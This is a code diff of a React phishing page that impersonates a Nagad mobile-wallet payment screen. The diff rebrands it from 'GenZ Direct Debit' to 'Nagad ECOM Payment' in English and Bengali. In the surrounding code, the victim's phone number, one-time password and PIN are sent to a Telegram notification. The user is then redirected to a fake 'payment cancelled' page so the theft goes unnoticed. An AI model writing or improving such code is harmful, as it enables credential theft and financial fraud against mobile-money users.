@@ -37,7 +37,7 @@ const NagadPayment = () => {
     const handlePopState = () => {
       window.history.pushState(null, "", window.location.href);
       if (showOtpView || showPinView) {
-        navigate(`/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=${amount}`);
+        navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);
       } else {
         navigate(`/?amount=${amount}`);
       }
@@ -163,7 +163,7 @@ const NagadPayment = () => {
       sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') });
       setTimeout(() => {
         setIsLoading(false);
-        navigate(`/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=${amount}`);
+        navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);
       }, 2000);
     }
   };
@@ -172,12 +172,12 @@ const NagadPayment = () => {
     setOtpResent(true);
   };
   const handleClose = () => {
-    navigate(`/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=${amount}`);
+    navigate(`/payment-cancelled?channel=Nagad ECOM Payment&reason=Payment isn't completed&amount=${amount}`);
   };
 
   // Translations
   const t = {
-    title: language === 'bn' ? 'জেনজেড ডাইরেক্ট ডেবিট' : 'GenZ Direct Debit',
+    title: language === 'bn' ? 'নগদ ইকম পেমেন্ট' : 'Nagad ECOM Payment',
     invoiceNo: language === 'bn' ? 'ইনভয়েস নং:' : 'Invoice No:',
     totalAmount: language === 'bn' ? 'মোট পরিমাণ:' : 'Total Amount:',
     charge: language === 'bn' ? 'চার্জ:' : 'Charge:',
